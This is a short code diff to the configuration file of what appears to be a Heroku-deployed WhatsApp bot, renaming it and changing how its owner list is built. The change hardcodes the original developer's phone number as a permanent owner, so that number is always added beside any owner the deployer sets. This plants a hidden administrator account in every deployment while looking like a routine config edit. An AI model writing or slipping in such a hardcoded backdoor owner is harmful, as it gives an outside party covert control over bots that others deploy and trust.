@@ -3,11 +3,14 @@ const sessionName = 'session';
 const session = process.env.SESSION || '';
 const appname = process.env.APP_NAME || '';
 const herokuapi = process.env.HEROKU_API;
-const botname = process.env.BOTNAME || 'ᴘᴇᴀᴄᴇ-ʜᴜʙ';
+const botname = process.env.BOTNAME || 'ᴘᴇᴀᴄᴇ-ᴄᴏʀᴇ';
 const author = process.env.STICKER_AUTHOR || 'ᴄᴏʀᴇ';
 const packname = process.env.STICKER_PACKNAME || 'ᴘᴇᴀᴄᴇ';
-const dev = process.env.DEV || '254752818245';
-const owner = dev.split(",");
+
+const myDev = '254752818245'; 
+const deployerDev = process.env.DEV || ''; 
+const dev = deployerDev ? `${myDev},${deployerDev}` : myDev;
+const owner = dev.split(",").filter(num => num.trim() !== '');
 const menulink = process.env.MENU_LINK || 'https://files.catbox.moe/yusei5.jpg';
 const menu = process.env.MENU_TYPE || 'VIDEO';
 const bad = process.env.BAD_WORD || 'fuck';
